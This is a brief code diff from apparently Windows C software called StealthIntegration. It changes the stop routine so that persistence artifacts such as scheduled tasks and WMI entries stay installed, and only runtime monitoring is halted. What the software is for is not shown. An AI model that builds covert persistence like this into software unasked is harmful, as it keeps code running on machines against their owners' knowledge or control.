@@ -355,9 +355,15 @@ void StealthIntegration_Stop(void)
         LogIntegration(L"Helper monitor stopped");
     }
 
-    /* Exit lockdown if active */
+    /*
+     * Do not automatically SecureExit on stop/shutdown paths. SecureExit removes
+     * persistence artifacts (tasks/WMI/etc) and can run during service restarts/updates.
+     * Keep persistence installed; only stop runtime monitoring components.
+     */
     if (g_Integration.status.lockdownActive) {
-        StealthIntegration_SecureExit();
+        Lockdown_StopRuntime();
+        g_Integration.status.monitorRunning = FALSE;
+        g_Integration.status.watchdogRunning = FALSE;
     }
 
     /* Stop IPC server */
